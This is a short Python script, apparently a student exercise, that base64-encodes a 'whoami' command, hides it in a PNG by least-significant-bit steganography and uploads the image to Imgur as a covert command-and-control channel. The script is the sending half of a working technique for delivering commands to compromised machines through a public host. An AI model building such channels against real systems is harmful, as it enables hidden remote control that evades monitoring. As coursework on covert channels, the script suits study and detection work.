# Fabian Ferristo Tirtabudi - 2301864581 #

import base64
import pyimgur
import stegano

IMAGE_ORIGINAL = "image_original.png"
IMAGE_TO_UPLOAD = "image_with_command.png"
IMGUR_CLIENT_ID = "" # masukkan client_id
COMMAND = "whoami"

print("\n-----------------------------------------------------------------")
encoded_command = base64.b64encode(COMMAND.encode()).decode()

image_with_command = stegano.lsb.hide(IMAGE_ORIGINAL, encoded_command)
image_with_command.save(IMAGE_TO_UPLOAD)
print("Encoded command injected to '" + IMAGE_TO_UPLOAD + "': " + stegano.lsb.reveal(IMAGE_TO_UPLOAD))
print("-----------------------------------------------------------------")

upload = pyimgur.Imgur(IMGUR_CLIENT_ID)
uploaded = upload.upload_image(IMAGE_TO_UPLOAD, title = "stegano sebagai c&c")
print("Imgur link: " + uploaded.link)
print("Delete hash: " + uploaded.deletehash)
print("-----------------------------------------------------------------\n")
